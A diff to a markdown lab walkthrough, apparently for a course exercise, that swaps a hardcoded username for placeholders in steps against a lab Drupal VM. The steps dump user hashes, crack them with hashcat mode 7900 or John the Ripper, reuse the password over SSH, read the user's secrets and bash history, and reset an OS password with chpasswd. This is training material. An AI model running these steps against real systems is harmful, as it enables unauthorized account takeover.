@@ -192,22 +192,40 @@ mysql -u drupal -pdrupalpass drupal -e "SELECT uid,name,mail,pass FROM users;"
 
 ## Task 3 — System Security Weaknesses
 
+> 🧠 **Pre-flight — set placeholder variables on Kali before running Task 3 commands.**
+>
+> Your weak user might be named `john`, `mark`, `alice`, or whatever you (or chief) created. Set these variables ONCE on Kali, then reuse them in every command below:
+>
+> ```bash
+> # On Kali — set these two variables to match YOUR setup:
+> export VICTIM=john              # ← change to your weak user's name
+> export VPASS=password123        # ← change to the password you set / expect to crack
+> ```
+>
+> Throughout Task 3, you'll see `$VICTIM` (the username) and `$VPASS` (the password). If you change to a different terminal session, re-run these `export` lines.
+
 ### Q1 — Identify the user account that exposes the system weakness
 
-From the Drupal users table (Task 2.6), one user has a deliberately weak password. Looking at usernames:
+From the Drupal users table (Task 2 Q2 dump), one user has a deliberately weak password. The dump looks like:
 
 ```
-uid | name  | mail              | pass
-----+-------+-------------------+---------------------
-1   | admin | admin@manila.local| $S$D... (long hash)
-2   | john  | john@manila.local | $S$D... (long hash)
+uid | name      | mail                    | pass
+----+-----------+-------------------------+---------------------
+1   | admin     | admin@manila.local      | $S$D... (long hash)
+2   | <VICTIM>  | <VICTIM>@manila.local   | $S$D... (long hash)
 ```
 
-**The weakness candidate is `john`** — admin account is typically protected by procedure; a regular user with a weak password is the typical "exposes a weakness" pattern.
+**The weakness candidate is the regular user (uid 2 or higher), NOT `admin`** — admin accounts are typically protected by stricter procedures; a regular user with a weak password is the typical "exposes a weakness" pattern.
 
-📸 **Screenshot the Drupal /admin/people page showing the user list, OR the users table dump highlighting john.**
+If you're unsure which user is weakest, look at the Drupal admin panel:
+1. Browse to `http://192.168.2.1/?q=admin/people` (logged in as admin)
+2. List shows all users. The non-admin user with a "Marketing" or generic role + non-strong password is your target.
 
-**Answer Q1:** *"User account `john` (uid=2) — exposes the system weakness via a weak password that violates security policies."*
+📸 **Screenshot the Drupal `/admin/people` page showing the user list, OR the users table dump highlighting your target user.**
+
+**Answer Q1:** *"User account `<VICTIM>` (uid=N) — exposes the system weakness via a weak password that violates security policies."*
+
+> **Replace `<VICTIM>` with the actual username** in your report. E.g. if you created `mark`, write: *"User account `mark` (uid=2) — exposes the system weakness..."*
 
 ### Q2 — Crack john's password
 
@@ -233,25 +251,27 @@ uid | name  | mail              | pass
 
 #### 2.1 — Get the hash from the DB dump (Drupal 7 hash format starts with `$S$`)
 
-From the Task 2 DB dump, copy john's full `$S$D...` hash. Then on **Kali** (not the target):
+From the Task 2 DB dump, copy your target user's full `$S$D...` hash (the long string in the `pass` column for `$VICTIM`'s row). Then on **Kali** (not the target):
 ```bash
 # Save the hash to a file — use echo -n to avoid trailing newline
-echo -n '$S$D...paste_johns_full_hash...' > /tmp/john.hash
+# Replace the placeholder with the ACTUAL hash you copied
+echo -n '$S$D...paste_full_hash_for_$VICTIM...' > /tmp/$VICTIM.hash
 
 # Verify the file is clean (no trailing newline, no extra characters)
-cat /tmp/john.hash; echo "[end]"
+cat /tmp/$VICTIM.hash; echo "[end]"
 # Should print: $S$D...whatever[end]  ← [end] right after, no blank line
 ```
 
 > ⚠️ **Watch for these common pitfalls:**
-> - Don't include the username prefix (`john:` or `admin:`) — mode 7900 wants ONLY the hash
+> - Don't include the username prefix (`$VICTIM:` or `admin:`) — mode 7900 wants ONLY the hash
 > - Don't include trailing whitespace or `\n` — use `echo -n` not plain `echo`
 > - Don't truncate — the full hash is ~55 characters starting with `$S$D`
+> - The hash file path uses `$VICTIM` so it auto-names per your user (e.g. `/tmp/mark.hash` if `VICTIM=mark`)
 
 #### 2.2 — Crack with hashcat
 Drupal 7 hash mode = `7900` in hashcat:
 ```bash
-hashcat -m 7900 /tmp/john.hash /usr/share/wordlists/rockyou.txt
+hashcat -m 7900 /tmp/$VICTIM.hash /usr/share/wordlists/rockyou.txt
 ```
 
 > 🧠 **WATCH FOR TYPOS in the path.** The folder is **`wordlists`** (w-o-r-d-l-i-s-t-s), not `wordlsits`. A typo here causes `No such file or directory`.
@@ -265,26 +285,34 @@ ls -la /usr/share/wordlists/rockyou.txt
 
 Wait ~5–30 sec. Hashcat will print:
 ```
-$S$D...:password123
+$S$D...:<your_cracked_password>
 
 Status...........: Cracked
 ```
 
+Update your `VPASS` variable with the actual cracked value (handy for later steps):
+```bash
+export VPASS=<paste_cracked_password_here>
+echo "Cracked: $VICTIM = $VPASS"
+```
+
 Show the cracked result anytime later:
 ```bash
-hashcat -m 7900 /tmp/john.hash --show
-# Output: $S$D...:password123
+hashcat -m 7900 /tmp/$VICTIM.hash --show
+# Output: $S$D...:<cracked_password>
 ```
 
 Or with John the Ripper as a fallback:
 ```bash
-john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/john.hash
-john --show --format=drupal7 /tmp/john.hash
+john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/$VICTIM.hash
+john --show --format=drupal7 /tmp/$VICTIM.hash
 ```
 
 📸 **Screenshot hashcat showing the cracked password.**
 
-**Answer Q2:** *"john's password is `password123`, cracked using hashcat mode 7900 (Drupal 7) against rockyou.txt wordlist in under 1 minute."*
+**Answer Q2:** *"`$VICTIM`'s password is `$VPASS` (substitute actual values — e.g. `mark`'s password is `letmein123`), cracked using hashcat mode 7900 (Drupal 7) against rockyou.txt wordlist in under 1 minute."*
+
+> **In your report, write the actual username + password.** Example: *"User `mark`'s password is `letmein123`, cracked using hashcat mode 7900..."*
 
 #### Common errors at this step
 
@@ -297,13 +325,17 @@ john --show --format=drupal7 /tmp/john.hash
 | Hashcat opens then immediately exits with no result | Already cracked previously — check with `hashcat -m 7900 /tmp/john.hash --show` | Re-run with `--show` to see cached crack |
 | `Cannot allocate memory` / OpenCL errors | VM has no GPU; hashcat tries OpenCL | Add `-D 1 --force --workload-profile 1` to use CPU only |
 
-### Q3 — Sensitive info in john's home directory
+### Q3 — Sensitive info in `$VICTIM`'s home directory
 
 Use the cracked password to SSH in:
 ```bash
-ssh john@192.168.2.1
-# password: password123
+ssh $VICTIM@192.168.2.1
+# password: $VPASS  (will be silent — type it carefully)
 ```
+
+> ⚠️ **If SSH says "Permission denied":** the Drupal CMS password and the Linux OS password might be different. Two fallbacks:
+> 1. **Use privesc first** (Q4 below) — read `/home/$VICTIM/secret.txt` as root after you escalate. Skips SSH entirely.
+> 2. **Reset the OS password to match:** after privesc to root: `echo "$VICTIM:$VPASS" | chpasswd` then retry SSH.
 
 Then explore:
 ```bash
@@ -312,18 +344,25 @@ ls -la
 cat secret.txt
 ```
 
-Output: `Hidden flag in john's home: flag{john_was_here_2025}`
+Expected output (the exact flag value depends on your setup — usually `flag{...}` format):
+```
+Hidden flag in $VICTIM's home: flag{<contents_set_during_setup>}
+```
+
+If your setup script (per `03_Setup_VMs_MA1.md` Step 2.5) used `flag{john_was_here_2025}` literally, the file content reflects that. If you customized it, the content is whatever you put in.
 
 Also check:
 ```bash
-cat .bash_history     # commands john ran
-ls -la ~/.ssh/         # any SSH keys?
-find / -user john 2>/dev/null   # all files owned by john
+cat .bash_history          # commands $VICTIM ran
+ls -la ~/.ssh/             # any SSH keys?
+find / -user $VICTIM 2>/dev/null   # all files owned by $VICTIM
 ```
 
-📸 **Screenshot of `cat secret.txt` and any other interesting files.**
+📸 **Screenshot of `cat secret.txt` showing the actual flag value.**
 
-**Answer Q3:** *"In john's home directory `/home/john/secret.txt` — content: `flag{john_was_here_2025}`. File permissions 600 (owner-readable only)."*
+**Answer Q3:** *"In `$VICTIM`'s home directory `/home/$VICTIM/secret.txt` — content: `<actual_flag_text>`. File permissions 600 (owner-readable only)."*
+
+> **In your report, replace placeholders with actuals.** Example: *"In mark's home directory `/home/mark/secret.txt` — content: `flag{compromised_user_2025}`. File permissions 600..."*
 
 ### Q4 — Gain root access + sensitive info from /root/
 
